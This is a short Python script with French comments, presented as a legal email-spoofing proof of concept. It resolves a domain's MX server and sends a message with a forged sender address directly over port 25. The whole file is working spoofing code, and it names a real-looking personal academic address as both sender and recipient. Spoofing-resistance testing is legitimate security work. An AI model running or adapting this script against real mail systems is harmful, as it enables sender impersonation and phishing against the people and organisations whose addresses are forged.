import smtplib
import dns.resolver
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket

# --- CONFIGURATION ---
# Utilise un domaine que tu contrôles et une adresse autorisée
SENDER_FAKE = "lounes.abbar@ac-creteil.fr"
RECIPIENT_REAL = "lounes.abbar@ac-creteil.fr"  # Remplace par une boîte que tu contrôles

def get_mx_record(domain):
    try:
        records = dns.resolver.resolve(domain, 'MX')
        mx_record = sorted(records, key=lambda r: r.preference)[0]
        return str(mx_record.exchange).strip('.')
    except Exception as e:
        print(f"[ERREUR] Impossible de trouver le MX pour {domain}: {e}")
        return None

def send_fake_mail():
    print(f"--- Démarrage du PoC Spoofing (test légal) ---")

    domain_recipient = RECIPIENT_REAL.split('@')[1]
    mx_server = get_mx_record(domain_recipient)

    if not mx_server:
        return

    print(f"[*] Serveur cible trouvé : {mx_server}")
    print(f"[*] Tentative de connexion sur le port 25...")

    msg = MIMEMultipart()
    msg['From'] = SENDER_FAKE
    msg['To'] = RECIPIENT_REAL
    msg['Subject'] = "Test légal de spoofing"

    body = "Ceci est un test légal sur un domaine contrôlé."
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP(mx_server, 25, timeout=20)
        server.set_debuglevel(1)

        local_hostname = socket.gethostname()
        server.ehlo(local_hostname)
        server.starttls()  # Active le chiffrement
        server.ehlo(local_hostname)  # Ré-identification

        server.sendmail(SENDER_FAKE, RECIPIENT_REAL, msg.as_string())

        print(f"\n[SUCCÈS] Le mail a été accepté par {mx_server} !")
        print("Vérifie ta boîte de réception.")

        server.quit()

    except Exception as e:
        print(f"\n[ERREUR] {e}")

if __name__ == "__main__":
    send_fake_mail()
